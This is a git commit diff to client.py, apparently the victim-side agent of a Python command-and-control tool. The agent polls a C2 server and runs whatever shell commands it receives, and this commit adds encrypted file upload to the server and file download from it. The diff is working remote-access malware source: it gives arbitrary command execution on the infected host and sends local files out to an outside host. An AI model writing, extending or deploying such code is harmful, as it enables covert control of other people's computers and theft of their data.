ae63b3ae9a2d853361e70c3e439a309560d74b57
byt3scr1b3 <89225495+byt3scr1b3@users.noreply.github.com>
2024-03-07 09:45:03 +0100

    upload & download function & more

--- client.py
+++ client.py
@@ -1,8 +1,9 @@
 from time import time, sleep
-from requests import get, post, exceptions
+from requests import get, post, exceptions, put
 from subprocess import run, PIPE, STDOUT
 from encryption import cipher
-from settings import PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
+from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER,
+                      FILE_REQUEST, FILE_SEND)
 from os import getenv, chdir, getcwd
 
 client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
@@ -21,7 +22,6 @@ def post_to_server(message: str, response_path=RESPONSE):
 while True:
     try:
         response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
-        print(response.status_code)
         if response.status_code == 404:
             raise exceptions.RequestException
     except exceptions.RequestException:
@@ -44,9 +44,47 @@ while True:
             post_to_server("There was an operating system error on the client.\n")
         else:
             post_to_server(getcwd(), CWD_RESPONSE)
+
+    elif not command.startswith("client "):
+        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
+        post_to_server(command_output.decode())
+
+    elif command.startswith("client download"):
+        filename = None
+        try:
+            filepath = command.split()[2]
+            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
+            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
+            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
+                     proxies=PROXY) as response:
+                if response.status_code == 200:
+                    with open(filename, "wb") as file_handle:
+                        file_handle.write(cipher.decrypt(response.content))
+                    post_to_server(f"{filename} is now on {client}.\n")
+        except IndexError:
+            post_to_server("You must enter the filename to download.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to write {filename} to disk on {client}.\n")
+
+    elif command.startswith("client upload"):
+        filepath = None
+        try:
+            filepath = command.split()[2]
+            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
+            encrypted_filename = cipher.encrypt(filename.encode()).decode()
+            with open(filepath, "rb") as file_handle:
+                encrypted_file = cipher.encrypt(file_handle.read())
+                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True,
+                    proxies=PROXY, headers=HEADER)
+        except IndexError:
+            post_to_server("You must enter the filepath to upload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on {client}.\n")
+
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been killed.\n")
         exit()
+
     elif command.startswith("client sleep "):
         try:
             delay = float(command.split()[2])
@@ -58,6 +96,5 @@ while True:
             post_to_server(f"{client} will sleep for {delay} seconds.\n")
             sleep(delay)
             post_to_server(f"{client} is now awake.\n")
-    else:
-        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
-        post_to_server(command_output.decode())
+
+
